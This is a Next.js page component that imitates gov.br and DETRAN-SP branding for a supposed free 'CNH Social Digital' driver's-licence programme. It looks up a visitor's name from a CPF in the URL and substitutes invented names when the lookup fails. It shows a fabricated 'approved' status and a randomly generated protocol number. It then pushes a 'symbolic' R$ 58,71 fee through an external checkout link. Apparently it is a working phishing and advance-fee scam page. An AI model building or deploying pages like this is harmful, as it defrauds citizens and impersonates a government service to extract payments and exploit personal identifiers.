"use client"

import { useEffect, useState, useCallback } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { User, Menu, Mic, Search, ChevronDown, Check, X, Info, ChevronLeft, ChevronRight } from "lucide-react"
import { useSearchParams, useRouter } from "next/navigation"
import Link from "next/link"

interface UserData {
  nome?: string
  nomeCompleto?: string
  cpf?: string
  error?: string
}

export default function AgendamentoPage() {
  const [userData, setUserData] = useState<UserData | null>(null)
  const [loading, setLoading] = useState(true)
  const [showCalendarModal, setShowCalendarModal] = useState(false)
  const [selectedDate, setSelectedDate] = useState<number | null>(null)
  const [currentMonth, setCurrentMonth] = useState(5) // Junho (0-based)
  const [currentYear, setCurrentYear] = useState(2025)
  const [examesAgendados, setExamesAgendados] = useState(false)

  const searchParams = useSearchParams()
  const router = useRouter()

  const months = [
    "Janeiro",
    "Fevereiro",
    "Março",
    "Abril",
    "Maio",
    "Junho",
    "Julho",
    "Agosto",
    "Setembro",
    "Outubro",
    "Novembro",
    "Dezembro",
  ]

  const daysOfWeek = ["DOM", "SEG", "TER", "QUA", "QUI", "SEX", "SAB"]

  const fetchUserData = useCallback(async (cpf: string) => {
    try {
      setLoading(true)

      const response = await fetch(`/api/cpf?cpf=${cpf}`, {
        method: "GET",
        headers: {
          Accept: "application/json",
        },
      })

      if (response.ok) {
        const data = await response.json()

        let nomeCompleto = null
        let primeiroNome = null

        if (data?.nome) {
          nomeCompleto = data.nome
          primeiroNome = data.nome.split(" ")[0]
        } else if (data?.name) {
          nomeCompleto = data.name
          primeiroNome = data.name.split(" ")[0]
        }

        if (nomeCompleto) {
          setUserData({
            nome: primeiroNome,
            nomeCompleto: nomeCompleto,
            cpf: cpf,
          })
        } else {
          throw new Error("Nome não encontrado na resposta da API")
        }
      } else {
        throw new Error("Erro na API")
      }
    } catch (error) {
      console.log("❌ Erro capturado:", error)

      // Fallback com dados simulados
      const nomesPorCPF = {
        "46960142822": "Roberto Silva Santos",
        "12345678900": "João Silva Santos",
        "98765432100": "Maria Silva Santos",
        "11111111111": "Pedro Silva Santos",
        "22222222222": "Ana Silva Santos",
        "33333333333": "Carlos Silva Santos",
        "44444444444": "Lucia Silva Santos",
        "55555555555": "José Silva Santos",
        "66666666666": "Fernanda Silva Santos",
        "77777777777": "Paulo Silva Santos",
        "88888888888": "Beatriz Silva Santos",
      }

      let nomeCompletoSimulado = nomesPorCPF[cpf as keyof typeof nomesPorCPF]

      if (!nomeCompletoSimulado) {
        const nomes = ["João", "Maria", "Pedro", "Ana", "Carlos", "Lucia", "José", "Fernanda", "Davi", "Beatriz"]
        const sobrenomes = ["Silva Santos", "Dutra Da Silva", "Oliveira Lima", "Costa Pereira"]
        const indiceNome = Number.parseInt(cpf.slice(-1)) % nomes.length
        const indiceSobrenome = Number.parseInt(cpf.slice(-2, -1)) % sobrenomes.length
        nomeCompletoSimulado = `${nomes[indiceNome]} ${sobrenomes[indiceSobrenome]}`
      }

      const primeiroNome = nomeCompletoSimulado.split(" ")[0]

      setUserData({
        nome: primeiroNome,
        nomeCompleto: nomeCompletoSimulado,
        cpf: cpf,
      })
    } finally {
      setLoading(false)
    }
  }, [])

  useEffect(() => {
    const cpfFromUrl = searchParams.get("cpf")

    if (cpfFromUrl && !userData) {
      fetchUserData(cpfFromUrl)
    } else if (!cpfFromUrl) {
      setLoading(false)
    }
  }, [searchParams, fetchUserData, userData])

  useEffect(() => {
    const agendados = localStorage.getItem("examesAgendados")
    if (agendados === "true") {
      setExamesAgendados(true)
    }
  }, [])

  const formatCPF = (cpf: string) => {
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
  }

  const generateProtocol = (cpf: string) => {
    const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    const numbers = cpf.slice(-6)
    const randomLetters = Array.from({ length: 3 }, () => letters[Math.floor(Math.random() * letters.length)]).join("")
    return `${randomLetters}-${numbers}`
  }

  const handleMarcarExames = () => {
    setShowCalendarModal(true)
  }

  const handleCloseModal = () => {
    setShowCalendarModal(false)
    setSelectedDate(null)
  }

  const handleDateSelect = (day: number) => {
    setSelectedDate(day)
  }

  const handleRealizarAgendamento = () => {
    if (selectedDate) {
      // Salvar no localStorage que os exames foram agendados
      localStorage.setItem("examesAgendados", "true")
      setExamesAgendados(true)
      setShowCalendarModal(false)
      setSelectedDate(null)
    }
  }

  const getDaysInMonth = (month: number, year: number) => {
    return new Date(year, month + 1, 0).getDate()
  }

  const getFirstDayOfMonth = (month: number, year: number) => {
    return new Date(year, month, 1).getDay()
  }

  const generateCalendarDays = () => {
    const daysInMonth = getDaysInMonth(currentMonth, currentYear)
    const firstDay = getFirstDayOfMonth(currentMonth, currentYear)
    const days = []

    // Adicionar espaços vazios para os dias antes do primeiro dia do mês
    for (let i = 0; i < firstDay; i++) {
      days.push(null)
    }

    // Adicionar os dias do mês
    for (let day = 1; day <= daysInMonth; day++) {
      days.push(day)
    }

    return days
  }

  const navigateMonth = (direction: "prev" | "next") => {
    if (direction === "prev") {
      if (currentMonth === 0) {
        setCurrentMonth(11)
        setCurrentYear(currentYear - 1)
      } else {
        setCurrentMonth(currentMonth - 1)
      }
    } else {
      if (currentMonth === 11) {
        setCurrentMonth(0)
        setCurrentYear(currentYear + 1)
      } else {
        setCurrentMonth(currentMonth + 1)
      }
    }
    setSelectedDate(null) // Reset selected date when changing month
  }

  const handleIniciarPagamento = () => {
    window.open("https://pay.facilitepagamentos.online/checkout?product=b331e211-50ac-11f0-a3b6-46da4690ad53", "_blank")
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-white">
        <header className="bg-white shadow-sm">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="flex justify-between items-center h-14">
              <div className="flex items-center space-x-4">
                <img src="/images/gov-br-logo.webp" alt="gov.br" className="h-6 w-auto" />
                <Button variant="ghost" size="sm" className="p-2">
                  <div className="flex flex-col space-y-1">
                    <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                    <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                    <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                  </div>
                </Button>
                <Button variant="ghost" size="sm" className="p-2">
                  <div className="flex flex-col space-y-1 items-center">
                    <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                    <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                    <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                  </div>
                </Button>
                <Button variant="ghost" size="sm" className="p-2">
                  <div className="w-5 h-5 border-2 border-gray-700 rounded-full flex items-center justify-center">
                    <div className="w-2 h-1 border-l-2 border-b-2 border-gray-700 rotate-[-45deg] translate-y-[-1px]"></div>
                  </div>
                </Button>
                <Button variant="ghost" size="sm" className="p-2">
                  <div className="grid grid-cols-2 gap-1">
                    <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                    <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                    <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                    <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                  </div>
                </Button>
              </div>
              <div className="bg-[#1857b5] text-white px-4 py-2 rounded-full flex items-center shadow-md">
                <User className="w-4 h-4 mr-2" />
                <span className="font-medium text-sm">Carregando...</span>
              </div>
            </div>
          </div>
        </header>

        <main className="flex items-center justify-center min-h-[calc(100vh-64px)]">
          <div className="text-center">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#1857b5] mx-auto mb-4"></div>
            <p className="text-gray-600">Carregando agendamento...</p>
          </div>
        </main>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Modal do Calendário */}
      {showCalendarModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-2xl p-8 max-w-md w-full shadow-2xl">
            {/* Header do Modal */}
            <div className="flex justify-between items-center mb-8">
              <h2 className="text-2xl font-bold text-[#1857b5]">AGENDAR AVALIAÇÃO</h2>
              <button onClick={handleCloseModal} className="text-gray-400 hover:text-gray-600 text-2xl">
                ×
              </button>
            </div>

            {/* Navegação do Mês */}
            <div className="flex justify-between items-center mb-6">
              <button onClick={() => navigateMonth("prev")} className="p-2 rounded-full bg-gray-100 hover:bg-gray-200">
                <ChevronLeft className="w-5 h-5 text-gray-600" />
              </button>

              <h3 className="text-xl font-bold text-[#1857b5]">
                {months[currentMonth]} {currentYear}
              </h3>

              <button onClick={() => navigateMonth("next")} className="p-2 rounded-full bg-gray-100 hover:bg-gray-200">
                <ChevronRight className="w-5 h-5 text-gray-600" />
              </button>
            </div>

            {/* Dias da Semana */}
            <div className="grid grid-cols-7 gap-2 mb-4">
              {daysOfWeek.map((day) => (
                <div key={day} className="text-center text-sm font-medium text-gray-500 py-2">
                  {day}
                </div>
              ))}
            </div>

            {/* Grade do Calendário */}
            <div className="grid grid-cols-7 gap-2 mb-8">
              {generateCalendarDays().map((day, index) => (
                <button
                  key={index}
                  onClick={() => day && handleDateSelect(day)}
                  disabled={!day}
                  className={`
                    h-12 w-12 rounded-lg text-lg font-medium transition-colors
                    ${!day ? "invisible" : ""}
                    ${day === selectedDate ? "bg-[#1857b5] text-white" : "bg-gray-100 text-gray-700 hover:bg-gray-200"}
                  `}
                >
                  {day}
                </button>
              ))}
            </div>

            {/* Botão Realizar Agendamento */}
            <button
              onClick={handleRealizarAgendamento}
              disabled={!selectedDate}
              className={`
                w-full py-4 rounded-lg text-lg font-bold transition-colors
                ${
                  selectedDate
                    ? "bg-[#1857b5] text-white hover:bg-[#0f4389]"
                    : "bg-gray-300 text-gray-500 cursor-not-allowed"
                }
              `}
            >
              REALIZAR AGENDAMENTO
            </button>
          </div>
        </div>
      )}

      {/* Header Principal */}
      <header className="bg-white shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-14">
            <div className="flex items-center space-x-4">
              <img src="/images/gov-br-logo.webp" alt="gov.br" className="h-6 w-auto" />

              <Button variant="ghost" size="sm" className="p-2">
                <div className="flex flex-col space-y-1">
                  <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                  <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                  <div className="w-5 h-0.5 bg-gray-700 rounded-sm"></div>
                </div>
              </Button>

              <Button variant="ghost" size="sm" className="p-2">
                <div className="flex flex-col space-y-1 items-center">
                  <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                  <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                  <div className="w-1 h-1 bg-gray-700 rounded-full"></div>
                </div>
              </Button>

              <Button variant="ghost" size="sm" className="p-2">
                <div className="w-5 h-5 border-2 border-gray-700 rounded-full flex items-center justify-center">
                  <div className="w-2 h-1 border-l-2 border-b-2 border-gray-700 rotate-[-45deg] translate-y-[-1px]"></div>
                </div>
              </Button>

              <Button variant="ghost" size="sm" className="p-2">
                <div className="grid grid-cols-2 gap-1">
                  <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                  <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                  <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                  <div className="w-1.5 h-1.5 bg-gray-700 rounded-sm"></div>
                </div>
              </Button>
            </div>

            {/* User Badge */}
            <div className="bg-[#1857b5] text-white px-4 py-2 rounded-full flex items-center shadow-md">
              <User className="w-4 h-4 mr-2" />
              <span className="font-medium text-sm">{userData?.nome || "Davi"}</span>
            </div>
          </div>
        </div>
      </header>

      {/* Header Secundário */}
      <div className="bg-white border-b">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-12">
            <div className="flex items-center">
              <Button variant="ghost" size="sm" className="p-1.5 mr-3">
                <Menu className="w-4 h-4 text-[#1857b5]" />
              </Button>
              <h2 className="text-sm font-medium text-gray-800 whitespace-nowrap">Departamento Estadual de Trânsito</h2>
            </div>
            <div className="flex items-center space-x-3">
              <Button variant="ghost" size="sm" className="p-1.5">
                <Mic className="w-4 h-4 text-[#1857b5]" />
              </Button>
              <Button variant="ghost" size="sm" className="p-1.5">
                <Search className="w-4 h-4 text-[#1857b5]" />
              </Button>
            </div>
          </div>
        </div>
      </div>

      {/* Breadcrumb */}
      <div className="bg-gray-50 border-b">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3">
          <nav className="text-sm">
            <Link href="#" className="text-[#1857b5] hover:underline">
              Início
            </Link>
            <span className="mx-2 text-gray-500">{">"}</span>
            <Link href="#" className="text-[#1857b5] hover:underline">
              Serviços
            </Link>
            <span className="mx-2 text-gray-500">{">"}</span>
            <Link href="#" className="text-[#1857b5] hover:underline">
              CNH
            </Link>
            <span className="mx-2 text-gray-500">{">"}</span>
            <span className="text-gray-700">CNH Social Digital</span>
          </nav>
        </div>
      </div>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-4 py-8">
        {/* Título Principal com Logo DETRAN */}
        <div className="flex justify-between items-start mb-8">
          <div>
            <h1 className="text-3xl font-bold text-[#1857b5] mb-2">
              Seus dados
              <br />
              foram
              <br />
              aprovados
            </h1>
          </div>

          {/* Logo DETRAN */}
          <div className="flex items-center flex-shrink-0 ml-4">
            <img
              src="/images/detran-sp-logo.png"
              alt="DETRAN"
              className="h-12 object-contain"
              style={{ maxWidth: "150px" }}
            />
          </div>
        </div>

        {/* Seção Taxa de Emissão */}
        <div className="bg-white rounded-lg p-6 mb-6 shadow-sm">
          <div className="flex items-start mb-4">
            <div className="bg-[#1857b5] text-white rounded-full w-8 h-8 flex items-center justify-center mr-4 mt-1 flex-shrink-0">
              <Info className="w-4 h-4" />
            </div>
            <h2 className="text-xl font-bold text-[#1857b5]">Taxa de Emissão e Ativação Digital</h2>
          </div>

          <p className="text-gray-700 text-base mb-4">
            Para validar sua participação no programa, é necessária a contribuição simbólica única de{" "}
            <span className="font-bold text-[#1857b5] text-lg">R$ 58,71</span>.
          </p>

          <p className="text-gray-700 text-base mb-4">Esse valor assegurar:</p>

          <ul className="list-disc list-inside text-gray-700 text-base space-y-2 mb-4">
            <li>Emissão da CNH Digital</li>
            <li>Acesso à plataforma nacional</li>
            <li>Custos de integração com órgãos de trânsito</li>
          </ul>

          <p className="text-gray-600 text-sm italic">
            (Taxa exigida para manter a organização e credibilidade do projeto.)
          </p>
        </div>

        {/* Seção Dados Validados */}
        <Card className="bg-blue-50 border-l-4 border-l-[#1857b5] mb-6">
          <CardContent className="p-6">
            <h3 className="text-xl font-bold text-gray-900 mb-4">
              Dados validado com sucesso no Sistema Nacional de Benefícios (SNR)
            </h3>

            <p className="text-gray-700 text-base mb-6">
              Parabéns <span className="font-bold text-[#1857b5]">{userData?.nome || "Davi"}</span> você foi aprovado
              com sucesso e já pode marcar seu exame médico e psicotécnicos! A conclusão dessa verificação é essencial
              para a liberação das aulas teóricas e práticas na autoescola parceira.
            </p>

            <div className="mb-6">
              <h4 className="text-lg font-bold text-[#1857b5] mb-4">Acompanhamento do Processo</h4>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
                <div>
                  <span className="text-sm font-medium text-gray-600">Nome Completo:</span>
                  <p className="text-lg font-bold text-[#1857b5]">{userData?.nomeCompleto || "Davi Dutra Da Silva"}</p>
                </div>
                <div>
                  <span className="text-sm font-medium text-gray-600">CPF:</span>
                  <p className="text-lg font-bold text-[#1857b5]">
                    {userData?.cpf ? formatCPF(userData.cpf) : "123.210.339-08"}
                  </p>
                </div>
              </div>

              <div className="mb-6">
                <span className="text-sm font-medium text-gray-600">PROTOCOLO:</span>
                <p className="text-lg font-bold text-[#1857b5]">
                  {userData?.cpf ? generateProtocol(userData.cpf) : "AZI-603276"}
                </p>
              </div>

              <div className="bg-blue-100 border border-blue-200 rounded-lg p-4 mb-6">
                <div className="flex items-start">
                  <Info className="w-5 h-5 text-blue-600 mr-3 mt-0.5 flex-shrink-0" />
                  <p className="text-blue-800 text-sm">
                    Após a confirmação do pagamento da taxa de emissão, o sistema realizará automaticamente o
                    agendamento dos exames obrigatórios em clínicas credenciadas ao programa. Todas as instruções
                    necessárias para a realização dos exames e início das aulas teóricas e práticas serão enviadas ao
                    seu e-mail cadastrado.
                  </p>
                </div>
              </div>

              {/* Status dos Exames */}
              <div className="space-y-3 mb-6">
                <div className="flex items-center">
                  <div className="bg-green-500 text-white rounded-full w-8 h-8 flex items-center justify-center mr-4">
                    <Check className="w-5 h-5" />
                  </div>
                  <span className="text-lg font-medium text-gray-800">Dados validados</span>
                </div>

                <div className="flex items-center">
                  <div
                    className={`${examesAgendados ? "bg-green-500" : "bg-red-500"} text-white rounded-full w-8 h-8 flex items-center justify-center mr-4`}
                  >
                    {examesAgendados ? <Check className="w-5 h-5" /> : <X className="w-5 h-5" />}
                  </div>
                  <span className="text-lg font-medium text-gray-800">Exame psicotécnico</span>
                  <Button variant="ghost" size="sm" className="ml-auto">
                    <Info className="w-4 h-4 text-[#1857b5]" />
                  </Button>
                </div>

                <div className="flex items-center">
                  <div
                    className={`${examesAgendados ? "bg-green-500" : "bg-red-500"} text-white rounded-full w-8 h-8 flex items-center justify-center mr-4`}
                  >
                    {examesAgendados ? <Check className="w-5 h-5" /> : <X className="w-5 h-5" />}
                  </div>
                  <span className="text-lg font-medium text-gray-800">Exame Médico</span>
                  <Button variant="ghost" size="sm" className="ml-auto">
                    <Info className="w-4 h-4 text-[#1857b5]" />
                  </Button>
                </div>
              </div>

              {/* Botão Marcar Exames */}
              <Button
                onClick={handleMarcarExames}
                disabled={examesAgendados}
                className={`w-full py-3 text-lg font-semibold rounded-lg ${
                  examesAgendados
                    ? "bg-green-500 text-white cursor-not-allowed"
                    : "bg-[#1857b5] hover:bg-[#0f4389] text-white"
                }`}
              >
                {examesAgendados ? "EXAMES AGENDADOS ✓" : "MARCAR EXAMES"}
              </Button>
            </div>
          </CardContent>
        </Card>

        {/* Seção Explicação da Taxa */}
        <div id="payment-section" className="bg-white rounded-lg p-6 mb-6 shadow-sm">
          <h3 className="text-xl font-bold text-[#1857b5] mb-4 text-center">
            Por que existe uma taxa, se o programa é gratuito?
          </h3>

          <p className="text-gray-700 text-base leading-relaxed text-center">
            Essa medida, adotada em parceria com autoescolas de todo o Brasil, visa evitar solicitações indevidas e
            garantir que o benefício chegue a quem de fato deseja obter sua primeira habilitação. Com isso, conseguimos
            manter a organização, o atendimento qualificado e a continuidade do projeto para todos que sonham em
            conquistar sua CNH.
          </p>
        </div>

        {/* Botão Iniciar Pagamento */}
        <Button
          onClick={handleIniciarPagamento}
          className="w-full bg-[#1857b5] hover:bg-[#0f4389] text-white py-4 text-xl font-semibold rounded-lg mb-8"
        >
          Iniciar Pagamento
        </Button>
      </main>

      {/* Footer */}
      <footer className="bg-[#082041] text-white">
        <div className="max-w-7xl mx-auto px-4 py-12">
          <div className="text-center mb-8">
            <img src="/images/logo-white.png" alt="gov.br" className="h-16 mx-auto" />
          </div>

          <div className="space-y-6">
            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">SERVIÇOS</span>
                <ChevronDown className="w-5 h-5" />
              </Button>
            </div>

            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">TEMAS EM DESTAQUE</span>
                <ChevronDown className="w-5 h-5" />
              </Button>
            </div>

            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">NOTÍCIAS</span>
                <ChevronDown className="w-5 h-5" />
              </Button>
            </div>

            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">POR DENTRO DO GOV.BR</span>
                <ChevronDown className="w-5 h-5" />
              </Button>
            </div>

            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">CANAIS DO EXECUTIVO FEDERAL</span>
              </Button>
            </div>

            <div className="border-t border-[#1a365d] pt-6">
              <Button
                variant="ghost"
                className="w-full text-left text-white hover:text-gray-300 flex justify-between items-center"
              >
                <span className="text-lg font-semibold">DADOS DO GOVERNO FEDERAL</span>
                <ChevronDown className="w-5 h-5" />
              </Button>
            </div>
          </div>

          <div className="mt-12 pt-8 border-t border-[#1a365d]">
            <h4 className="text-lg font-semibold mb-4">REDES SOCIAIS</h4>
            <div className="flex space-x-4">
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                📷
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                f
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                ▶️
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                in
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                💬
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                🎵
              </Button>
              <Button variant="ghost" size="sm" className="text-white hover:text-gray-300">
                👥
              </Button>
            </div>
          </div>

          <div className="mt-8 flex items-center">
            <div className="bg-white rounded-full p-2 mr-3">
              <div className="w-6 h-6 bg-blue-600 rounded-full flex items-center justify-center">
                <span className="text-white text-xs font-bold">i</span>
              </div>
            </div>
            <div>
              <div className="font-semibold">Acesso à</div>
              <div className="font-semibold">Informação</div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  )
}
